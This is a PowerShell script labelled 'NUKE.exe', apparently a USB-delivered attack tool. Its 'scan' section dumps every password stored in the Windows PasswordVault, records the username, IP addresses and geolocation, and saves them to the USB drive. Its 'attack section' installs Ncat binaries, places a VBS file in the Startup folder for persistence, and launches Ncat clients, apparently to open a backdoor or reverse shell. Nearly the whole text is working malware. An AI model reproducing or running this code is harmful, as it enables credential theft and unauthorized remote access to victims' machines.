Clear-Host
$title="
########################################################################
#                                                                      #
#                              NUKE.exe                                #
#                             by Charles                               #
#                                                                      #
########################################################################
"
$title

Set-ExecutionPolicy -Scope CurrentUser Unrestricted -force

#Var scan list----------------------------------------------------------------------------------------
$USBDriveLetter = Get-WmiObject -Class Win32_logicaldisk -Filter "VolumeName = 'NUKE'" | Select-Object "DeviceID"; $USBDriveLetter = $USBDriveLetter.DeviceID
$resultsLoc = "$USBDriveLetter\results"

$startupLoc = [Environment]::GetFolderPath('Startup'); $progfiles = (Get-ChildItem "env:ProgramFiles(x86)" | Select-Object Value); $progfiles = $progfiles.Value

$userdomain = $env:USERDOMAIN;If($null -ne $UserDomain){$userDomainStatus = "Saved   "}Else{$userDomainStatus = "Failed  "}
$username = $env:UserName;If($null -ne $username){$usernameStatus = "Saved "}Else{$usernameStatus = "Failed"}

$privateIP = $(ipconfig | Where-Object {$_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1]);If($null -ne $privateIP){$privateIPStatus = "Saved  "}Else{$privateIPStatus = "Saved  ";$privateIP = "[FAILED], (Currently Offline)"}
$publicIP = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content);If($null -ne $publicIP){$publicIPStatus = "Saved "}Else{$publicIPStatus = "Saved ";$publicIP = "[FAILED], (Currently Offline)"}; $geoStat = $publicIP; $publicIP | Select-Object > $null; $coordinates = $publicIP.loc; If($null -ne $coordinates){$coStatus = "Saved   "}Else{$coStatus = "Failed  "}; $publicIP | Select-Object > $null; $publicIP = $publicIP.ip

[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] > $null; $vault = New-Object Windows.Security.Credentials.PasswordVault; $password = (($vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword();$_ }) | Select-Object password); $password = $password.password;If($null -ne $password){$passwordStatus = "Saved "}Else{$passwordStatus = "Failed"}

$scanTime = Get-Date -Format "dddd dd/MM/yyyy HH:mm"

#End summary
$endscanSummarytxt = 
"-------------------------------------------------------------------------------------

Date & Time           :$scanTime

_____________________/SCAN RESULTS\______________________

   SCAN TYPE          SAVE STATUS       RESULTS     
Username              :$usernameStatus         :$username
UserDomain            :$userdomainStatus       :$userdomain
Password              :$passwordStatus         :$password
PublicIP              :$publicIPStatus         :$publicIP
PrivateIP             :$privateIPStatus        :$privateIP
Geo-Loc               :$coStatus       :$coordinates

"

$endscanSummarytxt, $geoStat | Out-File -FilePath "$resultsLoc\$username's Scan Results.txt"
#End of scan section------------------------------------------------------------------------------------

#Start of attack section--------------------------------------------------------------------------------

If(!(Test-Path "$progfiles\Nmap"))
{
   New-Item -Path "$progfiles\Nmap" -ItemType "directory" > $null
   Copy-Item -Path "$USBfolderLoc\nuke\Nmap\*" -Destination "$progfiles\Nmap"
}
ElseIf((Test-Path "$progfiles\Nmap") -and (!(Test-Path "$progfiles\Nmap\NcatClientService.exe")))
{
   Copy-Item -Path "$USBfolderLoc\nuke\Nmap\NcatClientService.exe" -Destination "$progfiles\Nmap"
   Copy-Item -Path "$USBfolderLoc\nuke\Nmap\NcatClient.exe" -Destination "$progfiles\Nmap"
}
If(!(Test-Path "$startupLoc\startupNC.vbs"))
{
   Copy-Item -Path "$USBfolderLoc\nuke\startupNC.vbs" -Destination $startupLoc
   If(!(Test-Path "$startupLoc\startupNC.vbs"))
   {
      Pause
   }
}

If (!(Get-Process -Name NcatClientService))
{
   Start-Process -File "$progfiles\Nmap\NcatClientService.exe"
}
If (!(Get-Process -Name NcatClient))
{
   Start-Process -File "$progfiles\Nmap\NcatClient.exe"
}